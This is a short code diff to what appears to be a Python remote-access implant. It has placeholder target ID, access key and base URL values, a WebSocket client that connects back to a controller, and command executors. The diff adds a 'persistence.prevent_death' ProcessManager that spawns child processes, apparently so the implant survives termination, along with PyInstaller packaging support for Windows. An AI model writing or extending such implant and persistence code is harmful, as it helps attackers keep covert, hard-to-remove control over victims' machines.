@@ -1,4 +1,5 @@
 import asyncio
+import multiprocessing
 import os
 import time
 import httpx
@@ -13,6 +14,7 @@ from enum import Enum
 
 from dependencies.modules.commands import Command as CommandEnum, CommandResult
 from dependencies.modules.commands import CommandArgs
+from dependencies.modules.persistence.prevent_death import ProcessManager
 from dependencies.globals import command_executor, command_executor_ws
 
 class ResponseType(Enum):
@@ -172,6 +174,9 @@ async def main():
     target_id = "TARGETID_TO_REPLACE"
     access_key = "ACCESS_KEY_TO_REPLACE"
     base_url = "BASE_URL_TO_REPLACE"
+    multiprocessing.freeze_support()  # Important for PyInstaller on Windows
+    pm = ProcessManager(number_of_children=4)
+    pm.run()
     client = WebSocketClient(base_url, target_id, access_key)
     await client.connect_websocket()
 
